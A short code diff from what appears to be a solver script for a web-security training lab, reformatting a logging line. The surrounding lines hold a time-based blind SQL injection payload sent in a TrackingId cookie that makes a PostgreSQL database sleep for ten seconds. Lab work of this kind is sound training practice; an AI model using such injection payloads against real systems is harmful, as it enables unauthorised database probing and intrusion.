@@ -3,9 +3,7 @@ import time
 
 
 def solve_lab(session):
-    logger.info(
-        f'Causing a 10 second delay by visiting "/" with the following cookies:'
-    )
+    logger.info('Causing a 10 second delay by visiting "/" with the following cookies:')
     logger.info('{"TrackingId": "\' || (select 1 from pg_sleep(10)) --"}')
 
     cookies = {"TrackingId": "' || (select 1 from pg_sleep(10)) --"}
